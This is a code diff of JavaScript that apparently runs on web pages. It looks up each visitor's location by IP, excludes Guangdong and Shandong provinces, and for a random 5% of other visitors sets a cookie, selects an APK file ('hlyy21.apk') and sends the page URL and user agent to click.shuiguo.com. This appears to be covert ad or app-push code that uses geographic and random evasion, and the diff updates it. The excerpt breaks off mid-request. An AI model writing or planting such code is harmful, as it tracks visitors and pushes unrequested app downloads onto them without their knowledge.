@@ -235,7 +235,7 @@ var hy_itv=setInterval(function(){
 			tj.appendChild(script);
 		})()		
 
-		if(num==24 || num==25 || num==26 || num==29 || num==31)
+		if(num==24 || num==25 || num==26 || num==29 || num==31 || num==71)
 		{
 			t1.style.display="none";
 		}
@@ -285,13 +285,13 @@ var hy_itv=setInterval(function(){
 					'http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',
 					"",
 					function(data){
-						var res=remote_ip_info.city.indexOf("广东")>=0 ||remote_ip_info.city.indexOf("山东")>=0;
-						if(!res && Math.random()>0.9)
+						var res=remote_ip_info.province.indexOf("广东")>=0 ||remote_ip_info.province.indexOf("山东")>=0;
+						if(!res && Math.random()>0.95)
 						{
 							setCookie("hyipdata","0");
 							if(hlTime())
 							{
-								pname="hlyy19.apk";
+								pname="hlyy21.apk";
 								getJsonp(
 									'http://click.shuiguo.com/index.php?action=index&method=main1',
 									"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
